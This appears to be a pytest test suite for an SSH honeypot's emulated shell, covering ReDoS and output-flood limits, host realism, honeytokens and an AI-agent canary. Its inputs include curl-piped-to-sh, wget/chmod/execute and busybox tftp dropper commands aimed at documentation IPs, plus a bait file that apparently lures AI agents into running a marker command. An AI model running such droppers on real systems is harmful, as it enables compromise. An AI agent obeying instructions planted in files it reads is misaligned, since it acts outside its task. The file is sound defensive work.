"""The shell under hostile and under ordinary input.

Two kinds of test. The first kind is about the engine surviving its
visitors: a pattern that never finishes, a command that would print
gigabytes, a format that raises. The second is about a visitor not being
able to tell: the commands loaders run give the answers a host gives, the
filesystem is the same each time it is looked at, and the two halves of the
engine that read a command line agree about what it did.
"""

import time

import pytest

from honeypot.capture.shell_capture import capture_command
from honeypot.capture.shell_writes import _printf, interpret
from honeypot.core import canary, dropper, hostfacts, honeytokens
from honeypot.core.config import config
from honeypot.core.identity import get_identity, reset_identity
from honeypot.core.modes import mode_handler
from honeypot.core.session import session_manager
from honeypot.core.shell_state import shell_states
from honeypot.core.textfilters import RegexBudget, SafePattern


@pytest.fixture(autouse=True)
def _deployment(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "session_capture_dir", str(tmp_path / "cap"))
    monkeypatch.setattr(config, "file_capture_dir", str(tmp_path / "uploads"))
    monkeypatch.setenv("HONEYPOT_IDENTITY_SEED", "424242")
    reset_identity()
    yield
    reset_identity()


@pytest.fixture
async def session():
    sid = await session_manager.create_session("ssh", "203.0.113.5", 51000)
    shell_states.get(sid).cwd = "/root"
    yield sid
    shell_states.drop(sid)


async def run(sid, command, is_root=True, username="root", **extra):
    """One command the way the transports run it: capture, then emulate."""
    home = "/root" if is_root else f"/home/{username}"
    await capture_command(sid, command, home, username, is_root)
    data = {"command": command, "username": username, "is_root": is_root, **extra}
    output = await mode_handler.handle_interaction(sid, "ssh", "command", data)
    return output, data


async def events(sid, kind):
    record = await session_manager.get_session(sid)
    return [e for e in record.network_events if e["event_type"] == kind]


# -- hostile input -------------------------------------------------------------

async def test_a_backtracking_pattern_cannot_hold_the_event_loop(session):
    started = time.perf_counter()
    out, _ = await run(session, "echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab | grep -E '(a|aa)+$'")
    elapsed = time.perf_counter() - started
    assert elapsed < 2.0, f"grep held the loop for {elapsed:.1f}s"
    assert "command not found" not in out


def test_the_budget_is_shared_and_falls_back_to_literal_matching():
    budget = RegexBudget(0.05)
    evil = SafePattern("(a|aa)+$", budget, extended=True)
    started = time.perf_counter()
    evil.search("a" * 40 + "b")
    assert time.perf_counter() - started < 1.0
    assert budget.exhausted
    # With the budget gone a later pattern is matched as text, anchors and all.
    plain = SafePattern("^processor", budget, extended=True)
    assert plain.search("processor\t: 0") == (0, 9)
    assert plain.search("model processor") is None


def test_printf_format_of_zeros_is_linear():
    started = time.perf_counter()
    _printf(["%" + "0" * 200_000])
    assert time.perf_counter() - started < 1.0


async def test_sed_and_awk_patterns_are_bounded_too(session):
    started = time.perf_counter()
    await run(session, "echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab | sed -E 's/(a|aa)+$/x/'")
    await run(session, "echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab | awk '/(a|aa)+$/ {print $1}'")
    assert time.perf_counter() - started < 3.0


async def test_cat_with_thousands_of_arguments_is_capped(session):
    await run(session, "echo " + "A" * 200_000 + " > /tmp/big")
    started = time.perf_counter()
    out, _ = await run(session, "cat " + "/tmp/big " * 3000)
    # Six hundred megabytes asked for; what one command may send comes back.
    assert out.startswith("AAAA") and 200_000 <= len(out) <= 256 * 1024
    assert time.perf_counter() - started < 2.0


async def test_history_does_not_replay_huge_lines(session):
    for _ in range(20):
        await run(session, "echo " + "A" * 200_000 + " > /dev/null")
    out, _ = await run(session, "history")
    assert len(out) < 40_000


async def test_tr_with_unequal_sets_does_not_raise(session):
    out, _ = await run(session, "printf 'a\\nb\\n' | tr '\\n' ' '")
    assert out == "a b "
    out, _ = await run(session, "echo hello | tr a-y b-z")
    assert out == "ifmmp\n"
    out, _ = await run(session, "echo hello | tr -d l")
    assert out == "heo\n"
    out, _ = await run(session, "echo HeLLo | tr '[:upper:]' '[:lower:]'")
    assert out == "hello\n"


# -- the commonest bot sequences -----------------------------------------------

async def test_curl_piped_to_sh_is_recorded_as_an_execution(session):
    out, data = await run(session, "curl -s http://198.51.100.7/i.sh | sh")
    assert "command not found" not in out and "No such file" not in out
    assert data["exit_status"] == 0
    [download] = await events(session, "file_download")
    assert download["piped_to_shell"] is True
    [execution] = await events(session, "payload_execution")
    assert execution["source_url"] == "http://198.51.100.7/i.sh"
    assert execution["interpreter"] == "sh"
    assert execution["path"] == "(stdin)"


async def test_sh_with_a_fetched_script_runs_it(session):
    await run(session, "cd /tmp; wget http://198.51.100.7/bins.sh")
    out, data = await run(session, "sh bins.sh")
    assert out == "" and data["exit_status"] == 0
    [execution] = await events(session, "payload_execution")
    assert execution["path"] == "/tmp/bins.sh"
    assert execution["source_url"] == "http://198.51.100.7/bins.sh"


async def test_sh_with_a_missing_script_fails_like_dash(session):
    out, data = await run(session, "sh nothing.sh")
    assert out == "sh: 0: Can't open nothing.sh\n"
    assert data["exit_status"] == 127
    assert await events(session, "payload_execution") == []


async def test_a_script_the_attacker_wrote_is_walked_when_run(session):
    await run(session, "cd /tmp")
    await run(session, "echo 'wget http://198.51.100.9/stage2 -O s2; chmod +x s2; ./s2' > run.sh")
    await run(session, "bash run.sh")
    downloads = await events(session, "file_download")
    assert [d["url"] for d in downloads] == ["http://198.51.100.9/stage2"]
    paths = [e["path"] for e in await events(session, "payload_execution")]
    assert paths == ["/tmp/run.sh", "/tmp/s2"]


async def test_absolute_paths_to_system_programs_run_them(session):
    identity = get_identity()
    out, data = await run(session, "/bin/uname -a")
    assert identity.kernel in out and data["exit_status"] == 0
    out, _ = await run(session, "/usr/bin/id -u")
    assert out == "0\n"
    out, data = await run(session, "/bin/nosuchprogram")
    assert "No such file or directory" in out and data["exit_status"] == 127
    out, data = await run(session, "/etc/passwd")
    assert "Permission denied" in out and data["exit_status"] == 126


async def test_sudo_and_busybox_fetches_are_fetches(session):
    await run(session, "cd /tmp")
    out, _ = await run(session, "sudo wget http://198.51.100.7/a")
    assert "200 OK" in out
    await run(session, "busybox tftp -g -r mips -l .m 198.51.100.8")
    await run(session, "/bin/busybox ftpget -u anonymous 198.51.100.9 arm7 bins/arm7")
    urls = [e["url"] for e in await events(session, "file_download")]
    assert urls == [
        "http://198.51.100.7/a",
        "tftp://198.51.100.8:69/mips",
        "ftp://198.51.100.9:21/bins/arm7",
    ]
    listing, _ = await run(session, "ls -a /tmp")
    assert ".m" in listing and "arm7" in listing


class TestFetchParsing:
    def test_an_option_value_is_not_the_url(self):
        d = dropper.parse("curl -m 30 http://203.0.113.9/x")
        assert (d.host, d.url) == ("203.0.113.9", "http://203.0.113.9/x")

    def test_curl_remote_name_keeps_the_url(self):
        d = dropper.parse("curl -O http://203.0.113.9/payload")
        assert d.url == "http://203.0.113.9/payload" and d.saves and d.filename == "payload"

    def test_a_quoted_query_string_survives(self):
        d = dropper.parse("wget 'http://203.0.113.9/get.php?a=1&b=2' -O out")
        assert d.url == "http://203.0.113.9/get.php?a=1&b=2"
        assert d.target == "out"

    def test_clustered_and_long_options(self):
        assert dropper.parse("wget -qO- http://h.example/a").saves is False
        assert dropper.parse("wget -q -T 5 --tries=2 -P /tmp http://h.example/a").target == "/tmp/a"
        assert dropper.parse("wget --no-check-certificate -nv https://h.example/a").port == 443
        d = dropper.parse("curl -fsSL -H 'X: y' --connect-timeout 5 -o /tmp/z http://h.example/a")
        assert (d.url, d.target) == ("http://h.example/a", "/tmp/z")

    def test_several_urls(self):
        found = dropper.parse_argv(["wget", "http://a.example/1", "http://b.example/2"])
        assert [d.host for d in found] == ["a.example", "b.example"]

    def test_resolved_address_follows_the_seed_not_a_constant(self):
        here = dropper.transcript(dropper.parse("wget http://c2.example/a"), 4096, seed=1)
        there = dropper.transcript(dropper.parse("wget http://c2.example/a"), 4096, seed=2)
        assert "10.0.0.9" not in here
        assert here.splitlines()[1] != there.splitlines()[1]
        assert dropper.resolved_address("c2.example", 1) == dropper.resolved_address("C2.example", 1)


# -- the two evaluators agree --------------------------------------------------

async def test_a_failed_cd_does_not_split_a_payload_across_two_paths(session):
    await run(session, "cd /data/local/tmp || cd /tmp; echo -ne '\\x7fELF' > .s")
    await run(session, "echo -ne '\\x01\\x02' >> .s")
    shell = shell_states.get(session)
    assert shell.cwd == "/tmp"
    assert {p: bytes(c) for p, c in shell.contents.items()} == {"/tmp/.s": b"\x7fELF\x01\x02"}
    out, _ = await run(session, "ls -a /tmp")
    assert ".s" in out


async def test_mkdir_then_cd_on_one_line_agrees(session):
    await run(session, "mkdir -p /tmp/.x/y && cd /tmp/.x/y && echo hi > f")
    shell = shell_states.get(session)
    assert shell.cwd == "/tmp/.x/y"
    assert list(shell.contents) == ["/tmp/.x/y/f"]


async def test_variables_reach_the_path_that_is_written(session):
    await run(session, "F=/tmp/.cfg; echo data > $F")
    out, _ = await run(session, "cat $F")
    assert out == "data\n"
    assert list(shell_states.get(session).contents) == ["/tmp/.cfg"]


async def test_a_for_loop_runs_its_body_in_both(session):
    await run(session, "cd /tmp")
    out, _ = await run(session, "for a in mips arm; do wget http://198.51.100.7/$a; echo $a >> seen; done")
    assert out.count("200 OK") == 2
    urls = [e["url"] for e in await events(session, "file_download")]
    assert urls == ["http://198.51.100.7/mips", "http://198.51.100.7/arm"]
    assert bytes(shell_states.get(session).contents["/tmp/seen"]) == b"mips\narm\n"


def test_appending_on_one_line_is_not_quadratic():
    chunk = "A" * 2000
    line = "; ".join(f"echo -n {chunk} >> /tmp/f" for _ in range(500))
    started = time.perf_counter()
    result = interpret(line, read_file=lambda _path: b"x" * 4_000_000)
    assert time.perf_counter() - started < 2.0
    assert len(result.writes) == 500


# -- what a shell does ---------------------------------------------------------

async def test_echo_n_and_variables_and_substitution(session):
    assert (await run(session, "echo -n hi"))[0] == "hi"
    assert (await run(session, "X=5; echo $X ${X}th \"$X\" '$X'"))[0] == "5 5th 5 $X\n"
    assert (await run(session, "echo $HOME $USER"))[0] == "/root root\n"
    identity = get_identity()
    assert (await run(session, "echo $(uname -m) `hostname`"))[0] == f"{identity.arch} {identity.hostname}\n"
    assert (await run(session, "A=$(nproc); echo $((A + 1))"))[0] == f"{identity.cpu_cores + 1}\n"
    assert (await run(session, "false; echo $?"))[0] == "1\n"
    out, _ = await run(session, "export K=v; env")
    assert "K=v\n" in out


async def test_while_and_if(session):
    out, _ = await run(session, "while true; do echo tick; done")
    assert 1 <= out.count("tick") <= 3
    out, _ = await run(session, "if [ -f /etc/passwd ]; then echo yes; else echo no; fi")
    assert out == "yes\n"
    out, _ = await run(session, "if [ -d /nope ]; then echo yes; else echo no; fi")
    assert out == "no\n"


async def test_text_tools_bots_use(session):
    identity = get_identity()
    assert (await run(session, "grep -c ^processor /proc/cpuinfo"))[0] == f"{identity.cpu_cores}\n"
    assert (await run(session, "cat /proc/cpuinfo | grep 'model name' | head -n1 | awk -F: '{print $2}'"))[0].strip() == identity.cpu_model
    assert (await run(session, "echo 'a b c' | awk '{print $2}'"))[0] == "b\n"
    assert (await run(session, "echo 'a b c' | awk '{print $NF, NR}'"))[0] == "c 1\n"
    assert (await run(session, "echo hello | sed 's/l/L/'"))[0] == "heLlo\n"
    assert (await run(session, "echo hello | sed -e 's/l/L/g'"))[0] == "heLLo\n"
    assert (await run(session, "printf 'a\\nb\\nc\\n' | sed -n 2p"))[0] == "b\n"
    assert (await run(session, "grep root /etc/passwd | cut -d: -f1,7"))[0] == "root:/bin/bash\n"
    assert (await run(session, "grep -i ROOT /etc/passwd | wc -l"))[0] == "1\n"
    out, data = await run(session, "grep nosuchuser /etc/passwd")
    assert out == "" and data["exit_status"] == 1
    assert (await run(session, "which awk sed grep top netstat ss"))[0].count("\n") == 6
    assert "command not found" not in (await run(session, "top -bn1"))[0]


async def test_free_honours_its_flags(session):
    identity = get_identity()
    kilobytes = (await run(session, "free"))[0].splitlines()[1].split()[1]
    megabytes = (await run(session, "free -m"))[0].splitlines()[1].split()[1]
    assert int(kilobytes) == identity.mem_kb
    assert int(megabytes) == identity.mem_kb // 1024
    assert (await run(session, "free -h"))[0].splitlines()[1].split()[1].endswith("Gi")


async def test_sleep_really_waits_but_not_for_long(session):
    started = time.perf_counter()
    await run(session, "sleep 0.3")
    assert time.perf_counter() - started >= 0.28
    started = time.perf_counter()
    await run(session, "sleep 0.2; sleep 0.2")
    assert 0.38 <= time.perf_counter() - started < 3


# -- the filesystem ------------------------------------------------------------

async def test_listings_hold_still_and_listed_files_can_be_read(session):
    first, _ = await run(session, "ls -la /etc")
    second, _ = await run(session, "ls -la /etc")
    assert first == second and first.count("\n") > 30
    names, _ = await run(session, "ls -1 /etc", pty=False)
    for name in names.split():
        out, data = await run(session, f"cat /etc/{name} > /dev/null; echo $?")
        # A directory is refused as one; everything else opens.
        kind, _ = await run(session, f"test -d /etc/{name}; echo $?")
        assert out.strip() == ("1" if kind.strip() == "0" else "0"), name


async def test_listed_size_is_the_size_read(session):
    out, _ = await run(session, "ls -l /etc/passwd")
    listed = int(out.split()[4])
    counted, _ = await run(session, "wc -c < /etc/passwd")
    assert int(counted) == listed == len(hostfacts.passwd(get_identity()).encode())


async def test_cd_only_enters_what_exists(session):
    out, data = await run(session, "cd /etc/nonexistent/deeper")
    assert "No such file or directory" in out and data["exit_status"] == 1
    out, _ = await run(session, "cd /etc/passwd")
    assert "Not a directory" in out
    for place in ("/tmp", "/var/run", "/mnt", "/dev/shm", "/var/tmp", "/usr/local/bin", "/"):
        out, data = await run(session, f"cd {place}")
        assert out == "" and data["exit_status"] == 0, place


async def test_ls_reports_what_is_missing(session):
    out, data = await run(session, "ls /nope")
    assert out == "ls: cannot access '/nope': No such file or directory\n"
    assert data["exit_status"] == 2


async def test_shadow_is_the_same_file_twice_and_closed_to_users(session):
    first, _ = await run(session, "cat /etc/shadow")
    second, _ = await run(session, "cat /etc/shadow")
    assert first == second and first.startswith("root:$6$")
    denied, data = await run(session, "cat /etc/shadow", is_root=False, username="admin")
    assert denied == "cat: /etc/shadow: Permission denied\n" and data["exit_status"] == 1


async def test_a_user_cannot_enter_roots_home(session):
    out, _ = await run(session, "cd /root", is_root=False, username="admin")
    assert "Permission denied" in out


async def test_the_tree_is_the_same_for_the_next_session_and_differs_by_seed(session):
    here, _ = await run(session, "ls -la /usr/bin /etc /root; ps aux | head -30; cat /etc/shadow")
    other = await session_manager.create_session("ssh", "203.0.113.6", 51001)
    shell_states.get(other).cwd = "/root"
    again, _ = await run(other, "ls -la /usr/bin /etc /root; ps aux | head -30; cat /etc/shadow")
    # The visitor's own shell differs between sessions; nothing else does.
    strip = lambda text: [l for l in text.splitlines() if "pts/0" not in l and "sshd: root" not in l]  # noqa: E731
    assert strip(here) == strip(again)
    shell_states.drop(other)

    assert hostfacts.shadow(get_identity()) != hostfacts.shadow(
        __import__("honeypot.core.identity", fromlist=["_derive"])._derive(7)
    )


# -- one machine ---------------------------------------------------------------

def test_cpu_vendor_follows_the_model():
    from honeypot.core.identity import _CPUS, _derive

    identity = _derive(1)
    for model, mhz, cores in _CPUS:
        identity.cpu_model = model
        vendor = "AuthenticAMD" if "AMD" in model else "GenuineIntel"
        assert f"vendor_id\t: {vendor}" in hostfacts.cpuinfo(identity), model
        assert vendor in hostfacts.lscpu(identity)


async def test_ps_shows_the_web_server_the_identity_claims(session, monkeypatch):
    from honeypot.core.config import EmulationProtocol

    monkeypatch.setattr(config, "enabled_protocols", [EmulationProtocol.SSH, EmulationProtocol.HTTP])
    identity = get_identity()
    out, _ = await run(session, "ps aux")
    wrong = "apache2" if identity.http_family == "nginx" else "nginx"
    assert identity.http_family in out and wrong not in out


async def test_ss_and_netstat_list_the_same_sockets(session, monkeypatch):
    from honeypot.core.config import EmulationProtocol

    monkeypatch.setattr(config, "enabled_protocols", [EmulationProtocol.SSH, EmulationProtocol.FTP])
    netstat, _ = await run(session, "netstat -tlnp")
    ss, _ = await run(session, "ss -tlnp")
    ports = lambda text: sorted({int(w.rsplit(":", 1)[1]) for l in text.splitlines() for w in l.split()  # noqa: E731
                                 if ":" in w and w.rsplit(":", 1)[1].isdigit()})
    assert ports(netstat) == ports(ss) == [21, 22, 53, 3306]
    sshd = hostfacts.process_named(get_identity(), "sshd")
    assert f"{sshd.pid}/sshd" in netstat and f"pid={sshd.pid}" in ss


def test_process_ids_differ_between_deployments():
    from honeypot.core.identity import _derive

    one = [p.pid for p in hostfacts.processes(_derive(1))]
    two = [p.pid for p in hostfacts.processes(_derive(2))]
    assert one != two and one == [p.pid for p in hostfacts.processes(_derive(1))]


# -- honeytokens ---------------------------------------------------------------

async def test_planted_secrets_are_in_the_files_and_are_this_deployments(session):
    tokens = honeytokens.get_honeytokens()
    env, _ = await run(session, "cat /var/www/html/.env")
    assert tokens.db_password in env and tokens.aws_access_key_id in env
    assert honeytokens.env_secrets()["DB_PASSWORD"] == tokens.db_password
    assert honeytokens.env_file_text() == env
    assert tokens.aws_secret_access_key in (await run(session, "cat ~/.aws/credentials"))[0]
    assert tokens.password in (await run(session, "cat /var/backups/config.bak"))[0]
    assert tokens.db_password in (await run(session, "cat /root/.bash_history"))[0]
    assert honeytokens.derive(b"a" * 32).db_password != honeytokens.derive(b"b" * 32).db_password
    # Reading them is not using them.
    assert await events(session, "honeytoken_used") == []


async def test_a_planted_credential_at_any_login_raises_the_event(session):
    tokens = honeytokens.get_honeytokens()
    await session_manager.record_auth_attempt(session, "root", "123456", False)
    assert await events(session, "honeytoken_used") == []
    await session_manager.record_auth_attempt(session, tokens.username, tokens.password, False)
    await session_manager.record_auth_attempt(session, tokens.username, tokens.password, False)
    await session_manager.record_auth_attempt(session, "admin", tokens.db_password, False)
    found = await events(session, "honeytoken_used")
    assert [(e["token_id"], e["kind"]) for e in found] == [
        ("login_pair", "credential"), ("db_password", "credential"),
    ]
    payload = (await session_manager.get_session(session)).to_backend_payload(1)
    assert [e["event_type"] for e in payload["events"]] == ["honeytoken_used", "honeytoken_used"]
    assert set(payload["events"][0]) >= {"token_id", "kind", "detail", "at"}


async def test_a_planted_key_used_in_a_command_raises_the_event(session):
    tokens = honeytokens.get_honeytokens()
    await run(session, f"export AWS_SECRET_ACCESS_KEY={tokens.aws_secret_access_key}")
    [found] = await events(session, "honeytoken_used")
    assert (found["token_id"], found["kind"]) == ("aws_access_key", "api_key")


# -- AI-agent canary -----------------------------------------------------------

async def test_reading_the_bait_does_nothing_and_acting_on_it_fires(session):
    identity = get_identity()
    listing, _ = await run(session, "ls ~")
    assert canary.BAIT_NAME in listing
    note, _ = await run(session, f"cat ~/{canary.BAIT_NAME}")
    assert canary.marker_command(identity) in note
    await run(session, f"grep -c assistant ~/{canary.BAIT_NAME}")
    await run(session, "ops-session --register wrong-token")
    assert await events(session, "ai_canary_triggered") == []

    out, data = await run(session, canary.marker_command(identity))
    assert out == "ops-session: registered\n" and data["exit_status"] == 0
    [fired] = await events(session, "ai_canary_triggered")
    assert fired["canary"] == canary.token(identity)
    assert fired["channel"] == "shell"
    assert "ops-session" in fired["detail"]


async def test_the_canary_can_be_switched_off(session, monkeypatch):
    monkeypatch.setattr(config, "ai_canary", False)
    listing, _ = await run(session, "ls -a ~")
    assert canary.BAIT_NAME not in listing
    out, data = await run(session, canary.marker_command(get_identity()))
    assert "command not found" in out and data["exit_status"] == 127
    assert await events(session, "ai_canary_triggered") == []


# -- Findings of the independent review ---------------------------------------

async def test_one_line_cannot_hold_the_event_loop(session):
    """A loop over a large variable through a long pipeline used to run to
    completion on the event loop: 1.8 s during which no other session, the
    heartbeat or the health check ran."""
    import asyncio
    import time

    longest_stall = 0.0

    async def ticker():
        # What every other session experiences: how long this task, which
        # wants to run every 5 ms, was kept waiting.
        nonlocal longest_stall
        while True:
            before = time.perf_counter()
            await asyncio.sleep(0.005)
            longest_stall = max(longest_stall, time.perf_counter() - before - 0.005)

    from honeypot.core.shell_state import shell_states

    # 63 KiB of short lines in a variable, as the reviewer's reproduction had.
    shell_states.get(session).variables["V"] = "\n".join(f"line {n % 977}" for n in range(7000))
    filters = " | ".join(["sort", "uniq", "sort -r", "grep line", "tr a-z A-Z", "tr A-Z a-z"] * 5)
    rounds = " ".join(str(n) for n in range(1, 25))
    task = asyncio.create_task(ticker())
    await asyncio.sleep(0.02)  # the ticker is running before the line starts
    started = time.perf_counter()
    await run(session, f'for i in {rounds}; do echo "$V" | {filters}; done')
    elapsed = time.perf_counter() - started
    await asyncio.sleep(0.01)
    task.cancel()
    assert longest_stall < 0.15, f"other tasks were kept waiting {longest_stall:.2f}s"
    assert elapsed < 0.8, f"one line took {elapsed:.2f}s of the loop's time"


async def test_planted_secrets_do_not_follow_from_the_identity_seed(session, monkeypatch):
    """The seed decides public facts and can be recovered from them; a planted
    password derived from it could be computed by someone who never read the
    file, and the canary token printed in robots.txt would give the seed away."""
    import hashlib

    from honeypot.core import canary, honeytokens
    from honeypot.core.identity import decoy_digest, decoy_secret, get_identity

    identity = get_identity()
    old_style = hashlib.sha256(f"{identity.seed}:ai-canary".encode()).hexdigest()
    assert old_style[:4] not in canary.token(identity).split("-")[1]
    assert len(decoy_secret()) >= 32
    assert decoy_digest("a") != decoy_digest("b")
    tokens = honeytokens.get_honeytokens()
    assert tokens.password != honeytokens.derive(hashlib.sha256(str(identity.seed).encode()).digest()).password


async def test_alert_events_survive_a_flood_of_ordinary_ones(session):
    """Five hundred request events used to fill the one shared cap, and the
    canary or honeytoken event that followed never reached the backend."""
    from honeypot.core.session import session_manager

    record = await session_manager.get_session(session)
    for index in range(record.MAX_NETWORK_EVENTS + 50):
        await session_manager.record_network_event(session, "http_request", {"n": index})
    await session_manager.record_network_event(session, "ai_canary_triggered", {"canary": "c", "channel": "http"})
    sent = record.to_backend_payload(1)["events"]
    assert [e["event_type"] for e in sent] == ["ai_canary_triggered"]


async def test_a_planted_login_past_the_attempt_cap_is_still_noticed(session):
    from honeypot.core import honeytokens
    from honeypot.core.session import session_manager

    record = await session_manager.get_session(session)
    for index in range(record.MAX_AUTH_ATTEMPTS):
        await session_manager.record_auth_attempt(session, "root", f"guess{index}", False)
    tokens = honeytokens.get_honeytokens()
    await session_manager.record_auth_attempt(session, tokens.username, tokens.password, True)
    assert await events(session, "honeytoken_used")
